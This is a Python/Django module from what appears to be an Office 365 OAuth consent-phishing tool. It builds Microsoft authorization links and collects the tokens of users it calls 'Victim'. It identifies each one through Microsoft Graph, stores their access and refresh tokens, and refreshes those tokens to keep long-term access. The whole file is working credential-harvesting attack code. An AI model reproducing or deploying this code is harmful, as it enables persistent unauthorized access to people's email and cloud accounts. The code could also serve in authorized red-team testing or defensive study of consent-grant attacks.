from .models import Victim, Application
from datetime import datetime
from requests_oauthlib import OAuth2Session
from django.utils.timezone import make_aware
from django.db.utils import IntegrityError
import copy
from collections import OrderedDict
import logging

logger = logging.getLogger('oauth.office365')


def get_authorization_url(app):
    """
    Helper function to build an authorization URL to be used.

    :return: A string representing the authorization URL
    """

    microsoft = get_oauth_session()

    authorization_url, state = microsoft.authorization_url(
        app.authorization_url,
        response_mode="form_post",
    )

    return authorization_url


def store_token(app, token):
    """
    Takes a token dictionary returned by the Microsoft OAuth provider and stores it
    in the database. Using the required 'user.read' scope it fetches some identifying information
    to store with the token

    :param app: The Application object
    :param token: The token dictionary returned by the provider
    :return:
    """
    microsoft = get_oauth_session(token=token)

    data = microsoft.get('https://graph.microsoft.com/v1.0/me').json()

    victim = Victim(
        name='Not given' if data['displayName'] is None else data['displayName'],
        email=data['userPrincipalName'],
        access_token=token['access_token'],
        refresh_token=token['refresh_token'],
        expires_at=make_aware(datetime.fromtimestamp(token['expires_at']))
    )

    try:

        victim.save()
        logger.info('Received token for user %s', victim.email, extra={'user': 'APP'})
    except IntegrityError:
        logger.info('Updated token for user %s', victim.email, extra={'user': 'APP'})
        victim = Victim.objects.get(email=data['userPrincipalName'])
        victim.refresh_token = token['refresh_token']
        victim.access_token = token['access_token']
        victim.expires_at = make_aware(datetime.fromtimestamp(token['expires_at']))
        victim.save()


def make_token_updater(victim):
    """
    Helper function to generate a victim aware token_updater function.

    :param victim: the Victim object to save the updated token to
    :return: token_updater(token) A Victim aware token updater that saves refreshed token to the given Victim
    """
    def token_updater(token):
        victim.access_token = token['access_token']
        victim.refresh_token = token['refresh_token']
        victim.expires_at = datetime.fromtimestamp(float(token['expires_at']))
        victim.save()
    return token_updater


def get_oauth_session(victim=None, token=None):
    """
    Helper function to instantiate a OAuth2Session object configured to handle interaction
    with the Azure v2 endpoint. Defines:
    * Scope for the session from the Application scope
    * Redirect URI
    * Token URI
    * Authorization URI
    * Refresh URI
    * Token if one exists
    * Token updater
    * Extra kwargs for token update

    :return: An instance of OAuth2Session ready for use
    """
    app = Application.objects.first()

    if token:
        token = token
        token_updater = None

    elif victim:
        token = {
            'access_token': victim.access_token,
            'refresh_token': victim.refresh_token,
            'expires_at': victim.expires_at.timestamp(),
            'token_type': 'bearer'
        }

        token_updater = make_token_updater(victim)

    else:
        token = None
        token_updater = None

    extra = {
        'redirect_uri': app.redirect_url,
        'client_id': app.client_id,
        'client_secret': app.client_secret
    }

    microsoft = OAuth2Session(
        app.client_id,
        token=token,
        scope=app.scopes.split(','),
        auto_refresh_kwargs=extra,
        auto_refresh_url=app.token_url,
        token_updater=token_updater,
        redirect_uri=app.redirect_url,
    )

    return microsoft


def prune(obj, key):
    # empty = True
    if type(obj[key]) is dict or type(obj[key]) is OrderedDict:
        empty = True
        for k, v in copy.copy(obj[key]).items():
            if type(v) is not list and type(v) is not dict and type(v) is not OrderedDict and v is not None:
                empty = False
            elif type(v) is list:
                for i in range(0, len(v)):
                    empty = prune(v, i)
                if len(v) == 0:
                    del obj[key][k]
            else:
                empty = prune(obj[key], k)
    elif type(obj[key]) is list:
        for i in range(0, len(obj[key])):
            empty = prune(obj[key], i)
        if len(obj[key]) == 0:
            del obj[key]
        else:
            empty = False
    else:
        if obj[key] is not None:
            empty = False
    if empty:
        del obj[key]
    return empty


def refresh_token(app, victim):
    """
    Takes a victim and refreshes their access token. Saves the resulting new token parameters
    to the Victim object and returns the updated fields as well

    :param app: The Application object representing the OAuth provider
    :param victim: The Victim to be refreshed
    :return: A Dictionary containing the updated token parameters
    """
    microsoft = get_oauth_session(victim)

    extra = {
        'redirect_uri': app.redirect_url,
        'client_id': app.client_id,
        'client_secret': app.client_secret
    }

    refreshed_token = microsoft.refresh_token(
        app.token_url,
        **extra
    )

    victim.access_token = refreshed_token['access_token']
    victim.refresh_token = refreshed_token['refresh_token']
    victim.expires_at = datetime.fromtimestamp(float(refreshed_token['expires_at']))
    victim.save()
    logger.info('Refreshed token for user %s', victim.email, extra={'user': 'APP'})

    return {
        'access_token': refreshed_token['access_token'],
        'refresh_token': refreshed_token['refresh_token'],
        'expires_at': refreshed_token['expires_at']
    }
